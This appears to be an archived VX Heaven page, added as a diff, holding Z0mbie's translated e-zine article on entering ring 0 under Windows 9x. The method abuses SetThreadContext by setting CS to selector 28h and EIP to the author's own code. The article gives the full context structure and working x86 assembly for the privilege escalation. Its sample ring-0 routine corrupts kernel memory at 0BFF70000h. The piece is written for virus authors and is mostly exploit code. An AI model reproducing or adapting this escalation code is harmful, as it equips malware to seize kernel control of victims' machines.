@@ -1,0 +1,184 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Z0mbie 'Entering Ring-0 Using Win32 Api: Context Modification' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Z0mbie"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Z0mbie,Entering Ring-0 Using Win32 Api: Context Modification, ring, save, context, system, code, call, thread, handle, function, iret, dword, kernel, structure, setthreadcontext, current"/>
+<meta name="Description" content="When an operating system called &quot;mustdie&quot;, this means at least something. So, here it is - unknown, shocking method of entering ring-0 under win9X."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"a9c27808feab90b083b7d8fb3edc7073806f1c43-1498756181-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vzo26.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Entering Ring-0 Using Win32 Api: Context Modification</h1><p><a href="/lib/?lang=en&amp;author=Z0mbie"> Z0mbie</a><br/> <em> 2000</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vzo26.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vzo26">Back to index</a>] [<a href="/lib/vzo26.html#disqus_thread">Comments</a>]<br/> 
+<p><em>xlated from russian for MATRiX #2 E-Zine</em></p>
+<p>When an operating system called "mustdie", this means at least something. So, here it is - unknown, shocking method of entering ring-0 under win9X.</p>
+<p>Patch of the system tables? Loading viral VxD? Bug in the system code? Exploit? Perverted calls via kernel? - NO! Just a standard, well-documented Win32 Api.</p>
+<p>Idea is to call SetThreadContext function. This function sets all the registers of the given thread.</p>
+<p>Main feature (which and makes possible to enter ring-0) is that code, that applies modified registers (in contrast to winNT/2000) doesn't performs enough check of segment register values, so...</p>
+<p>So, we're changing context.CS to 28h (ring0 selector), and context.EIP to offset of our ring0 subroutine.</p>
+<p>Now, more detailed.</p>
+<p>At first step we need to get handle of the thread in whose context we wanna to enter ring-0. Let it be current thread. So, we need to call GetCurrentThread.</p>
+<p>After that, we need to get context of that thread, i.e. to fill the context structure with current register values. This may be done by means of GetThreadContext.</p>
+<p>But, before calling context-related functions, we need to organize context structure. It is of 204 bytes length (0xCC) bytes, and, (this is important!) first DWORD of this structure must be -1. Using this DWORD as a bitset, context-managing functions will work with selected registers.</p>
+<p>Here is a complete context structure:</p>
+<pre class="source">
+thread_context_structure:
+c_contextflags          dd      -1
+c_dr0                   dd      ?
+c_dr1                   dd      ?
+c_dr2                   dd      ?
+c_dr3                   dd      ?
+c_dr6                   dd      ?
+c_dr7                   dd      ?
+c_fpu_controlword       dd      ?
+c_fpu_statusword        dd      ?
+c_fpu_tagword           dd      ?
+c_fpu_erroroffset       dd      ?
+c_fpu_errorselector     dd      ?
+c_fpu_dataoffset        dd      ?
+c_fpu_dataselector      dd      ?
+c_fpu_registerarea      db      80 dup (?)
+c_fpu_cr0npxstate       dd      ?
+c_gs                    dd      ?
+c_fs                    dd      ?
+c_es                    dd      ?
+c_ds                    dd      ?
+c_edi                   dd      ?
+c_esi                   dd      ?
+c_ebx                   dd      ?
+c_edx                   dd      ?
+c_ecx                   dd      ?
+c_eax                   dd      ?
+c_ebp                   dd      ?
+c_eip                   dd      ?
+c_cs                    dd      ?
+c_eflags                dd      ?
+c_esp                   dd      ?
+c_ss                    dd      ?
+</pre>
+<p> After we've filled context structure with all the shit (via GetThreadContext) we must:</p>
+<ol>
+<li>save old CS and EIP for the future restoration, and</li>
+<li>change current CS and EIP.</li>
+</ol>
+<p>After such harmful action, we're calling SetThreadContext function. And at this moment happens glorious event we was waiting for.</p>
+<p>Now, one more detailed.</p>
+<p>Ring3 subroutine SetThreadContext passes control to the ring0 code. This ring0 code changes all the registers selected by contextflags (-1), including CS:EIP, and performs IRET. But, on IRET control returns not back to kernel's SetThreadContext, but to our CS:EIP, because these CS:EIP were just changed by ring0 code.</p>
+<p>I need to say here, that if you will only set CS=28h leaving EIP unchanged, control will return to kernel, but in ring0 mode. But kernel will anyway use ring3 DS/ES/FS selectors, and it will fuckup system.</p>
+<p>Well, if you understood nothing, anyway, here is an example of entering ring0:</p>
+<pre class="source">
+callring0:              pusha
+                        enter   0C8h,0          ; context structure
+                        push    -1              ; contextflags = -1
+
+                        call    GetCurrentThread
+                        xchg    ebx, eax        ; EBX = thread handle
+
+                        push    esp             ; ESP = context structure
+                        push    ebx             ; EBX = thread handle
+                        call    GetThreadContext
+
+                        push    28h             ; save_cs = context.cs
+                        pop     eax             ; context.cs = 28h
+                        xchg    eax, [esp+0BCh]
+                        mov     save_cs, eax
+
+                        lea     eax, ring0code_caller
+                        xchg    eax, [esp+0B8h] ; save_eip = ctx.eip,
+                        mov     save_eip, eax   ; ctx.eip = @ring0code_caller
+
+                        push    esp             ; ESP = context structure
+                        push    ebx             ; EBX = thread handle
+                        call    SetThreadContext; call ring0
+                        ; back from ring-0
+
+                        pop     eax
+                        leave
+                        popa
+                        ret     ; callring0
+
+ring0code_caller:       mov     ss:save_esp, esp
+                        lea     esp, end_of_my_stack
+
+                        pushf
+                        pusha
+                        push    ds es
+
+                        push    ss ss           ; initialize DS/ES selectors
+                        pop     ds es           ; with 30h
+
+                        call    ring0
+
+                        pop     es ds
+                        popa
+                        popf
+
+                        mov     esp, ss:save_esp
+
+                        pushf
+                        push    ss:save_cs
+                        push    ss:save_eip
+                        iret                    ; return to kernel
+
+; this is YOUR ring-0 subroutine
+
+ring0:                  not     dword ptr ds:[0BFF70000h]
+                        VxDcall VXDLDR, GetDeviceList
+                        ...
+                        ret
+</pre>
+<p>Thats all!</p>
+<div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vzo26">de</a><a href="/lib/index.php?lang=en&amp;id=vzo26">en</a><a href="/lib/index.php?lang=es&amp;id=vzo26">es</a><a href="/lib/index.php?lang=it&amp;id=vzo26">it</a><a href="/lib/index.php?lang=fr&amp;id=vzo26">fr</a><a href="/lib/index.php?lang=pl&amp;id=vzo26">pl</a><a href="/lib/index.php?lang=ru&amp;id=vzo26">ru</a><a href="/lib/index.php?lang=ua&amp;id=vzo26">ua</a></div>
+</body>
+</html>
